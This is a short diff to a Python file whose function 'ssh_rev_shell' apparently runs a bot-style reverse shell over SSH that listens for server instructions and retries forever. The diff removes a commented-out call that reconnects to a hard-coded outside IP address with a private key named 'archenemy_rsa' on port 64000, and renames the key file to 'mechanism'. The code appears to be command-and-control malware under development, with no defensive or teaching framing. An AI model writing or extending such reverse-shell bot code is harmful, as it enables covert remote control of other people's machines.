@@ -127,12 +127,6 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
                 response = f"Timeout while listening new instructions!"
                 ssh_session.send(response.encode())
 
-                # Make a recursive call
-                #try:
-                #    ssh_rev_shell('34.204.78.186', 'ubuntu', './archenemy_rsa', user, 64000)
-                #except Exception as e:
-                #    pass
-
                 return
 
             #server_instructions = "kill"
@@ -146,7 +140,7 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 if __name__ == "__main__":
 
     #global user
-    auth_path = os.path.join(parent_dir, 'archenemy_rsa')
+    auth_path = os.path.join(parent_dir, 'mechanism')
 
     # Try forever the commands
     while True:
